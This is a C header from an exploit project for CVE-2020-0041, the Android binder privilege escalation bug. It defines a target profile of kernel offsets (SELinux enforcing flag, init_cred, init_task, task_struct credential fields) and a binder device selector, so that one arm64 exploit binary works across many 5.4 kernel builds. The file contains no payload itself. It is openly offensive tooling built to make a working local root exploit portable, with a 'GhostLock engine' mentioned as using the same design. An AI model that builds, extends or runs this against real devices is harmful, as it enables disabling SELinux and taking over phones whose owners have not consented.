/*
 * Runtime target profile for the CVE-2020-0041 privilege escalation exploit.
 *
 * Upstream hardcodes every kernel address for one Pixel 3 build. Those addresses are a property of
 * the kernel binary, not of the exploit, so they are read from a small text file instead. This
 * keeps one arm64 binary usable across every 5.4 and 5.4-qgki build that has a profile, which is
 * the same arrangement the GhostLock engine already uses.
 *
 * The file is a flat `key = value` list, one per line, `#` starts a comment. Addresses are offsets
 * from the kernel base, so a profile does not have to know where KASLR put the image.
 *
 *   release = 5.4.210-android12-9-g1234567-ab12345678
 *   binder_device = /dev/binder
 *   selinux_enforcing_offset = 0x2ba4000
 *   ...
 *
 * `tgt_load` returns 0 on success. A missing or incomplete profile is a hard failure: running with
 * a guessed address would write to the wrong kernel memory and panic the device, which is worse
 * than refusing to run.
 */
#ifndef TARGET_PROFILE_H
#define TARGET_PROFILE_H

#include <stdbool.h>
#include <stdint.h>

/* One loader-visible knob per hardcoded constant in src/exploit.c. */
struct target_profile {
    /* Kernel address offsets, relative to the kernel image base. */
    unsigned long selinux_enforcing_offset;
    unsigned long memstart_addr_offset;
    unsigned long sysctl_table_root_offset;
    unsigned long proc_douintvec_offset;
    unsigned long init_task_offset;
    unsigned long init_cred_offset;
    unsigned long pipe_fop_offset;

    /* struct task_struct member offsets. Stable across a kernel family, verified per profile. */
    unsigned long tasks_offset;
    unsigned long pid_offset;
    unsigned long mm_offset;
    unsigned long real_cred_offset;

    /* Which binder node the bug lives behind: /dev/binder, /dev/hwbinder or /dev/vndbinder. */
    char binder_device[64];

    /* `uname -r` this profile was recovered from, for the log and for a sanity check. */
    char release[128];
};

/* Loads `path`. Returns 0 on success, -errno style negative on failure. */
int tgt_load(const char *path);

/* The loaded profile. Only valid after a successful tgt_load. */
const struct target_profile *tgt(void);

/*
 * The node the bug lives behind. Devices differ: Pixel uses /dev/hwbinder, most others /dev/binder,
 * and some vendor daemons only expose /dev/vndbinder. Every translation unit that opens binder
 * includes this header, so the accessor lives here next to the profile it reads.
 */
#define BINDER_DEVICE (tgt()->binder_device)

/* Prints the loaded profile, used at startup so a run's log records what it targeted. */
void tgt_dump(void);

#endif
